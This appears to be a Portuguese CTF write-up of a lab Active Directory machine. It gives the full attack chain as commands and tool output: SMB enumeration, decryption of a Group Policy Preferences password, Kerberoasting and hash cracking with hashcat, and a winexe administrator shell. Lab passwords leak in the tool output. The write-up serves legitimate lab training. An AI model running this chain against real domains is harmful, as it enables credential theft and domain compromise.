#ctfs 

<img src="Imagens/Pasted%20image%2020261008231744.png" alt="Active" width="489">

# Reconhecimento inicial

A partir do IP fornecido iniciamos com um scan via `nmap`

```shell
└─$ nmap 10.129.103.161 -Pn --open -sC -p-             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-08 13:13 -03
Nmap scan report for 10.129.103.161
Host is up (0.14s latency).
Not shown: 65391 closed tcp ports (reset), 121 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49162/tcp open  unknown
49166/tcp open  unknown
49168/tcp open  unknown

Host script results:
| smb2-time: 
|   date: 2026-10-08T16:19:23
|_  start_date: 2026-10-08T16:04:46
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 506.56 seconds

```

Temos MUITAS portas abertas e seviços ativos, com destaque a um Kerberos, que indica termos um Active Directory e um SMB. Vamos iniciar nossa enumeração

# Enumeração

Podemos usar a ferramenta `enum4linux-ng` para explorarmos de uma vez alguns serviços ativos

```shell
└─$ enum4linux-ng -A 10.129.103.161
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.103.161
[*] Username ......... ''
[*] Random Username .. 'thdwatad'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 =======================================
|    Listener Scan on 10.129.103.161    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for 10.129.103.161    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: active.htb

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.103.161    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on 10.129.103.161    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                 
  SMB 1.0: false                                                                    
  SMB 2.0.2: true                                                                   
  SMB 2.1: true                                                                     
  SMB 3.0: false                                                                    
  SMB 3.1.1: false                                                                  
Preferred dialect: SMB 2.1                                                          
SMB1 only: false                                                                    
SMB signing required: true                                                          

 =============================================================
|    Domain Information via SMB session for 10.129.103.161    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                           
NetBIOS domain name: ACTIVE                                                         
DNS domain: active.htb                                                              
FQDN: DC.active.htb                                                                 
Derived membership: domain member                                                   
Derived domain: ACTIVE                                                              

 ===========================================
|    RPC Session Check on 10.129.103.161    |
 ===========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 =====================================================
|    Domain Information via RPC for 10.129.103.161    |
 =====================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED

 =================================================
|    OS Information via RPC for 10.129.103.161    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2                                               
OS version: '6.1'                                                                   
OS release: ''                                                                      
OS build: '7601'                                                                    
Native OS: not supported                                                            
Native LAN manager: not supported                                                   
Platform id: '500'                                                                  
Server type: '0x80102b'                                                             
Server type string: Wk Sv PDC Tim NT     Domain Controller                          

 =======================================
|    Users via RPC on 10.129.103.161    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ========================================
|    Groups via RPC on 10.129.103.161    |
 ========================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ========================================
|    Shares via RPC on 10.129.103.161    |
 ========================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:                                                                             
  comment: Remote Admin                                                             
  type: Disk                                                                        
C$:                                                                                 
  comment: Default share                                                            
  type: Disk                                                                        
IPC$:                                                                               
  comment: Remote IPC                                                               
  type: IPC                                                                         
NETLOGON:                                                                           
  comment: Logon server share                                                       
  type: Disk                                                                        
Replication:                                                                        
  comment: ''                                                                       
  type: Disk                                                                        
SYSVOL:                                                                             
  comment: Logon server share                                                       
  type: Disk                                                                        
Users:                                                                              
  comment: ''                                                                       
  type: Disk                                                                        
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: DENIED
[*] Testing share NETLOGON
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Replication
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Users
[+] Mapping: DENIED, Listing: N/A

 ===========================================
|    Policies via RPC for 10.129.103.161    |
 ===========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ===========================================
|    Printers via RPC for 10.129.103.161    |
 ===========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 71.57 seconds
```

Observe que temos um share anônimo no SMB de nome `Replication`, podemos começar por ele e verficar se há algum arquivo interessante.
## Credenciais Expostas

Ao logarmos anonimamente no SMB do share `Replication` e procurarmos a fundo encontramos o seguinte arquivo

```shell
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 07:37:44 2018
  ..                                  D        0  Sat Jul 21 07:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 17:46:06 2018

                5217023 blocks of size 4096. 279039 blocks available
```

Ao baixarmos o arquivo encontramos o seguinte conteúdo

```shell
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
</User>
</Groups>
```

Achamos o usuário `SVC_TGS` e a senha está em GPP, podemos usar o `gpp-decrypt`para descritografar

```shell
└─$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
[SENHA SVC_TGS]
```

Conseguimos uma credencial completa. Podemos rodar novamente o `enum4linux-ng`

## Enumeração com credenciais obtidas

```shell
└─$ enum4linux-ng -A 10.129.103.161 -u 'SVC_TGS' -p '[SENHA SVC_TGS]'
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.103.161
[*] Username ......... 'SVC_TGS'
[*] Random Username .. 'lhhrhwwb'
[*] Password ......... '[SENHA SVC_TGS]'
[*] Timeout .......... 10 second(s)

 =======================================
|    Listener Scan on 10.129.103.161    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for 10.129.103.161    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: active.htb

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.103.161    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on 10.129.103.161    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                 
  SMB 1.0: false                                                                    
  SMB 2.0.2: true                                                                   
  SMB 2.1: true                                                                     
  SMB 3.0: false                                                                    
  SMB 3.1.1: false                                                                  
Preferred dialect: SMB 2.1                                                          
SMB1 only: false                                                                    
SMB signing required: true                                                          

 =============================================================
|    Domain Information via SMB session for 10.129.103.161    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                           
NetBIOS domain name: ACTIVE                                                         
DNS domain: active.htb                                                              
FQDN: DC.active.htb                                                                 
Derived membership: domain member                                                   
Derived domain: ACTIVE                                                              

 ===========================================
|    RPC Session Check on 10.129.103.161    |
 ===========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for password authentication
[+] Server allows authentication via username 'SVC_TGS' and password 'GPPstillStandingStrong2k18'                                                                       
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 =====================================================
|    Domain Information via RPC for 10.129.103.161    |
 =====================================================
[+] Domain: ACTIVE
[+] Domain SID: S-1-5-21-405608879-3187717380-1996298813
[+] Membership: domain member

 =================================================
|    OS Information via RPC for 10.129.103.161    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2                                               
OS version: '6.1'                                                                   
OS release: ''                                                                      
OS build: '7601'                                                                    
Native OS: not supported                                                            
Native LAN manager: not supported                                                   
Platform id: '500'                                                                  
Server type: '0x80102b'                                                             
Server type string: Wk Sv PDC Tim NT     Domain Controller                          

 =======================================
|    Users via RPC on 10.129.103.161    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 4 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 4 user(s) via 'enumdomusers'
[+] After merging user results we have 4 user(s) total:
'1103':                                                                             
  username: SVC_TGS                                                                 
  name: SVC_TGS                                                                     
  acb: '0x00000210'                                                                 
  description: (null)                                                               
'500':                                                                              
  username: Administrator                                                           
  name: (null)                                                                      
  acb: '0x00000210'                                                                 
  description: Built-in account for administering the computer/domain               
'501':                                                                              
  username: Guest                                                                   
  name: (null)                                                                      
  acb: '0x00000215'                                                                 
  description: Built-in account for guest access to the computer/domain             
'502':                                                                              
  username: krbtgt                                                                  
  name: (null)                                                                      
  acb: '0x00020011'                                                                 
  description: Key Distribution Center Service Account                              

 ========================================
|    Groups via RPC on 10.129.103.161    |
 ========================================
[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 21 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 11 group(s) via 'enumdomgroups'
[+] After merging groups results we have 37 group(s) total:
'1101':                                                                             
  groupname: DnsAdmins                                                              
  type: local                                                                       
'1102':                                                                             
  groupname: DnsUpdateProxy                                                         
  type: domain                                                                      
'498':                                                                              
  groupname: Enterprise Read-only Domain Controllers                                
  type: domain                                                                      
'512':                                                                              
  groupname: Domain Admins                                                          
  type: domain                                                                      
'513':                                                                              
  groupname: Domain Users                                                           
  type: domain                                                                      
'514':                                                                              
  groupname: Domain Guests                                                          
  type: domain                                                                      
'515':                                                                              
  groupname: Domain Computers                                                       
  type: domain                                                                      
'516':                                                                              
  groupname: Domain Controllers                                                     
  type: domain                                                                      
'517':                                                                              
  groupname: Cert Publishers                                                        
  type: local                                                                       
'518':                                                                              
  groupname: Schema Admins                                                          
  type: domain                                                                      
'519':                                                                              
  groupname: Enterprise Admins                                                      
  type: domain                                                                      
'520':                                                                              
  groupname: Group Policy Creator Owners                                            
  type: domain                                                                      
'521':                                                                              
  groupname: Read-only Domain Controllers                                           
  type: domain                                                                      
'544':                                                                              
  groupname: Administrators                                                         
  type: builtin                                                                     
'545':                                                                              
  groupname: Users                                                                  
  type: builtin                                                                     
'546':                                                                              
  groupname: Guests                                                                 
  type: builtin                                                                     
'548':                                                                              
  groupname: Account Operators                                                      
  type: builtin                                                                     
'549':                                                                              
  groupname: Server Operators                                                       
  type: builtin                                                                     
'550':                                                                              
  groupname: Print Operators                                                        
  type: builtin                                                                     
'551':                                                                              
  groupname: Backup Operators                                                       
  type: builtin                                                                     
'552':                                                                              
  groupname: Replicator                                                             
  type: builtin                                                                     
'553':                                                                              
  groupname: RAS and IAS Servers                                                    
  type: local                                                                       
'554':                                                                              
  groupname: Pre-Windows 2000 Compatible Access                                     
  type: builtin                                                                     
'555':                                                                              
  groupname: Remote Desktop Users                                                   
  type: builtin                                                                     
'556':                                                                              
  groupname: Network Configuration Operators                                        
  type: builtin                                                                     
'557':                                                                              
  groupname: Incoming Forest Trust Builders                                         
  type: builtin                                                                     
'558':                                                                              
  groupname: Performance Monitor Users                                              
  type: builtin                                                                     
'559':                                                                              
  groupname: Performance Log Users                                                  
  type: builtin                                                                     
'560':                                                                              
  groupname: Windows Authorization Access Group                                     
  type: builtin                                                                     
'561':                                                                              
  groupname: Terminal Server License Servers                                        
  type: builtin                                                                     
'562':                                                                              
  groupname: Distributed COM Users                                                  
  type: builtin                                                                     
'568':                                                                              
  groupname: IIS_IUSRS                                                              
  type: builtin                                                                     
'569':                                                                              
  groupname: Cryptographic Operators                                                
  type: builtin                                                                     
'571':                                                                              
  groupname: Allowed RODC Password Replication Group                                
  type: local                                                                       
'572':                                                                              
  groupname: Denied RODC Password Replication Group                                 
  type: local                                                                       
'573':                                                                              
  groupname: Event Log Readers                                                      
  type: builtin                                                                     
'574':                                                                              
  groupname: Certificate Service DCOM Access                                        
  type: builtin                                                                     

 ========================================
|    Shares via RPC on 10.129.103.161    |
 ========================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:                                                                             
  comment: Remote Admin                                                             
  type: Disk                                                                        
C$:                                                                                 
  comment: Default share                                                            
  type: Disk                                                                        
IPC$:                                                                               
  comment: Remote IPC                                                               
  type: IPC                                                                         
NETLOGON:                                                                           
  comment: Logon server share                                                       
  type: Disk                                                                        
Replication:                                                                        
  comment: ''                                                                       
  type: Disk                                                                        
SYSVOL:                                                                             
  comment: Logon server share                                                       
  type: Disk                                                                        
Users:                                                                              
  comment: ''                                                                       
  type: Disk                                                                        
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[-] Could not check share: STATUS_INVALID_PARAMETER
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share Replication
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share Users
[+] Mapping: OK, Listing: OK

 ===========================================
|    Policies via RPC for 10.129.103.161    |
 ===========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:                                                        
  Password history length: 24                                                       
  Minimum password length: 7                                                        
  Minimum password age: 1 day 4 minutes                                             
  Maximum password age: 41 days 23 hours 53 minutes                                 
  Password properties:                                                              
  - DOMAIN_PASSWORD_COMPLEX: true                                                   
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                           
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                          
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                           
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                 
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                   
Domain lockout information:                                                         
  Lockout observation window: 30 minutes                                            
  Lockout duration: 30 minutes                                                      
  Lockout threshold: None                                                           
Domain logoff information:                                                          
  Force logoff time: not set                                                        

 ===========================================
|    Printers via RPC for 10.129.103.161    |
 ===========================================
[+] No printers available

Completed after 70.32 seconds
```

Esse é um resultado muito mais completo, resultado do acesso privilegiado do usuário utilizado. Olha que interessante o seguinte trecho do scan:

```shell
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[-] Could not check share: STATUS_INVALID_PARAMETER
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share Replication
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share Users
[+] Mapping: OK, Listing: OK
```

Antes tínhamos somente o `Replicaton` disponível, agora temos 4 shares. Vamos enumerar um a um começando pelo `Users`

```shell
└─$ smbclient //10.129.103.161/Users -U 'SVC_TGS'
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> list
0:      server=10.129.103.161, share=Users
smb: \> ls
  .                                  DR        0  Sat Jul 21 11:39:20 2018
  ..                                 DR        0  Sat Jul 21 11:39:20 2018
  Administrator                       D        0  Mon Jul 16 07:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 02:06:44 2009
  Default                           DHR        0  Tue Jul 14 03:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 02:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 01:57:55 2009
  Public                             DR        0  Tue Jul 14 01:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 12:16:32 2018
```

Conseguimos um acesso importante, podemos tentar enumerar a pasta de usuário que estamos utilizando

```shell
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 12:14:42 2018
  ..                                  D        0  Sat Jul 21 12:14:42 2018
  user.txt                           AR       34  Thu Oct  8 13:05:44 2026
```

Ao baixarmos o arquivo e abrirmos em nossa máquina conseguimos a primeira flag

```shell
└─$ cat user.txt  
[flag user.txt]
```

# Exploração do Kerberos

Verificamos os outros shares do SMB mas não havia nada interessante. Entretanto, ainda podemos usar nossas credenciais obtidas para extrair mais informações via `impacket`.

Podemos usar o utilitário `impacket-GetUserSPNs` para extrair hashs de contas de serviço com SPNs já que o usuário `SVC_TGS` não é um Domain Controller

```shell
└─$ impacket-GetUserSPNs -request -dc-ip 10.129.103.161 active.htb/SVC_TGS:'[SENHA SVC_TGS]'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 16:06:40.351723  2026-10-08 13:05:47.821345             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2b95d7bf6961e800d0c9a18b465e4568$59629672368144684eecddae72805638e865bdd0a9c5dc6ed0389bd0a5a58d35ccfd8ec4120e53d45effe61a34ee0dcfe273eab0fe4a833526fe800e2adfe13318df24e94df438c78f586648091efc87c427719e934bb4df502499dcd6f9ae0589bf8e3f3248646bc50c6014d1aa69f8db71471d8d03122d2e81426c5ed8888a2da634db3d8e83e2ee6e4fba61aafc11a6d944129a5380eb0a4a2b13e08178f9e47c1cee6bccba6950b096170e846e530999196ac4d1a876f61c1125b77bbe77689911eda25ecb690b3e44f418babe8c703061ce5c59c80f89c98b4c03ce02b2207eb015530bb2411765253b70cd2b05d301ff86b14a343fe8aa2ce415672c9c4033aac9a3a424ecb846b5e70dc3b614330d6088cd4c40681b21e492fea60aae10f16a20df2e04b711ad11e7635af49befd8e77a231cacb361ad1e7243b2cc51b79c596749dd59855d733baa11f79a933ff21c016585ee8f8fc0ebcf367bf562e9f37bb9f48f5f23fda04d0ae4503ebf7ad330e1388ebc8c172900a0f6e2cf212a1e39909beb5d5675f49afcdadd0310b9cd588004e5050a8b5dcecbd5a64485904b3547c418eb08b876a94d5aa865a57a4be2d2dc9a6fab077808a4a538ded73f80e20b7a976b5a7574dfd8ca3ac72e00d45eb3c26cfe418cc4dae4658e44d3343320119f7a234ba307947fadd9bec3b9d13219ef6fdfd795034eecfc1c7ced9a89ae2c4f2c03ac107b20e6fd6ca684d8910868f216d1247dbfc2fe400d50fcba52b7a53dd45f15e38f7efef8594795f17575eaf42ef813ded53520f4eee53ee78a753934969ecf603c9fba41278a5cd88c08ef56631a479d2cabea9bba3f144468ea4ea73956b27b270d59437cc33453e2e55c458d469606caa5ebb18f3e38709b74f80580cfe87fe46a13e712c553d59b84919f76e785f1018c1f0f5fb5e590c7cc7feaf6a16d0e7b89e500faba4d12faefc29fed76b10cc11a8a6ab3f428b85ef7906168d2b708c8f913bf5fa2c5d6bc90e70c05e7e6cb936b968ae702e44abb6c12a5c1f27c8c7c08f0a5fde6b36c9213c46a57149fb9be50b0fcbdbb0e73e1a3885af80899b5d3d4d80465e91bb8bd0e45f1169814c41a5bc4f51f05dcb242bcea85b7f74939f4e5a774b495422312e7b2f2a9b15982cbc8d36eaa99460cebc0153b928e68e0ce4e047b2db43a97adf73bda9cb6db9ade1bc38c742b5f5064c2821fca32abfc8ac24ffd91436a1c73d76e4570100c4c78
```

Observe esse resultado, ele achou credenciais para o `Administrator` do serviço CIFS

Podemos usar agora o `hashcat` para quebrar a senha

```shell
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 6655/13310 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 516 MB (6544 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2b95d7bf6961e800d0c9a18b465e4568$59629672368144684eecddae72805638e865bdd0a9c5dc6ed0389bd0a5a58d35ccfd8ec4120e53d45effe61a34ee0dcfe273eab0fe4a833526fe800e2adfe13318df24e94df438c78f586648091efc87c427719e934bb4df502499dcd6f9ae0589bf8e3f3248646bc50c6014d1aa69f8db71471d8d03122d2e81426c5ed8888a2da634db3d8e83e2ee6e4fba61aafc11a6d944129a5380eb0a4a2b13e08178f9e47c1cee6bccba6950b096170e846e530999196ac4d1a876f61c1125b77bbe77689911eda25ecb690b3e44f418babe8c703061ce5c59c80f89c98b4c03ce02b2207eb015530bb2411765253b70cd2b05d301ff86b14a343fe8aa2ce415672c9c4033aac9a3a424ecb846b5e70dc3b614330d6088cd4c40681b21e492fea60aae10f16a20df2e04b711ad11e7635af49befd8e77a231cacb361ad1e7243b2cc51b79c596749dd59855d733baa11f79a933ff21c016585ee8f8fc0ebcf367bf562e9f37bb9f48f5f23fda04d0ae4503ebf7ad330e1388ebc8c172900a0f6e2cf212a1e39909beb5d5675f49afcdadd0310b9cd588004e5050a8b5dcecbd5a64485904b3547c418eb08b876a94d5aa865a57a4be2d2dc9a6fab077808a4a538ded73f80e20b7a976b5a7574dfd8ca3ac72e00d45eb3c26cfe418cc4dae4658e44d3343320119f7a234ba307947fadd9bec3b9d13219ef6fdfd795034eecfc1c7ced9a89ae2c4f2c03ac107b20e6fd6ca684d8910868f216d1247dbfc2fe400d50fcba52b7a53dd45f15e38f7efef8594795f17575eaf42ef813ded53520f4eee53ee78a753934969ecf603c9fba41278a5cd88c08ef56631a479d2cabea9bba3f144468ea4ea73956b27b270d59437cc33453e2e55c458d469606caa5ebb18f3e38709b74f80580cfe87fe46a13e712c553d59b84919f76e785f1018c1f0f5fb5e590c7cc7feaf6a16d0e7b89e500faba4d12faefc29fed76b10cc11a8a6ab3f428b85ef7906168d2b708c8f913bf5fa2c5d6bc90e70c05e7e6cb936b968ae702e44abb6c12a5c1f27c8c7c08f0a5fde6b36c9213c46a57149fb9be50b0fcbdbb0e73e1a3885af80899b5d3d4d80465e91bb8bd0e45f1169814c41a5bc4f51f05dcb242bcea85b7f74939f4e5a774b495422312e7b2f2a9b15982cbc8d36eaa99460cebc0153b928e68e0ce4e047b2db43a97adf73bda9cb6db9ade1bc38c742b5f5064c2821fca32abfc8ac24ffd91436a1c73d76e4570100c4c78:[Senha Administrator]
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...0c4c78
Time.Started.....: Thu Oct  8 23:15:29 2026, (3 secs)
Time.Estimated...: Thu Oct  8 23:15:32 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3567.2 kH/s (2.58ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10551296/14344385 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> TUGGIE
Hardware.Mon.#01.: Temp: 74c Util: 28%

Started: Thu Oct  8 23:15:09 2026
Stopped: Thu Oct  8 23:15:34 2026
```

Bingo! Temos credenciais. Vamos enumerar novamente via `crackmapexec`

```shell
└─$ crackmapexec smb 10.129.103.161 -u 'Administrator' -p '[Senha Administrator]' --shares
SMB         10.129.103.161  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.103.161  445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.129.103.161  445    DC               [+] Enumerated shares
SMB         10.129.103.161  445    DC               Share           Permissions     Remark                                                                              
SMB         10.129.103.161  445    DC               -----           -----------     ------                                                                              
SMB         10.129.103.161  445    DC               ADMIN$          READ,WRITE      Remote Admin                                                                        
SMB         10.129.103.161  445    DC               C$              READ,WRITE      Default share                                                                       
SMB         10.129.103.161  445    DC               IPC$                            Remote IPC                                                                          
SMB         10.129.103.161  445    DC               NETLOGON        READ,WRITE      Logon server share                                                                  
SMB         10.129.103.161  445    DC               Replication     READ            
SMB         10.129.103.161  445    DC               SYSVOL          READ            Logon server share                                                                  
SMB         10.129.103.161  445    DC               Users           READ 
```

Todos os shares estão disponíveis agora e o melhor, como Domain Controller.

# Exploração final

Podemos usar o `winexe` para obter acesso ao host

```shell
└─$ winexe -U Administrator%[Senha Administrator] //10.129.103.161 cmd.exe
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
active\administrator
```

Ótimo, estamos na máquina como administradores, podemos pesquisar agora a flag no diretório do usuário `Administrator`

```shell
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

21/01/2021  07:49 ��    <DIR>          .
21/01/2021  07:49 ��    <DIR>          ..
08/10/2026  07:05 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.140.989.952 bytes free
```

E assim, finalmente:

```shell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
[flag root.txt]
```

Sendo assim, terminamos nossa máquina.
